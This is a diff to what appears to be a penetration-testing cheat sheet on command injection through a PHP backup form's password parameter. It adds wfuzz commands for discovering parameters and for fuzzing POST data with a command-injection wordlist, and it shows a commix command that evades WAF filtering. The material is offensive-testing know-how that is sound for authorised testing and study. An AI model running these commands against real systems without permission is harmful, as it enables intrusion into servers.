@@ -26,9 +26,18 @@ if (isset($_POST['backup']) && !empty($_POST['password'])) {
         ];
 # In this example, we can terminate the zip command and execute code using the "Password Parameter"
 ```
+
+Using wfuzz to test for parameter existence
+```bash
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
+```
 ## Exploitation
 ### Command injection
-Using commix to detect and exploit command injection
+**Using commix to detect and exploit command injection**
 ```bash
 commix --url="<URL>?<parameter>=" --level=3 --force-ssl --skip-waf --random-agent --cookie="<cookie>"
+```
+**Command Injectionw with POST data**
+```bash
+wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
 ```
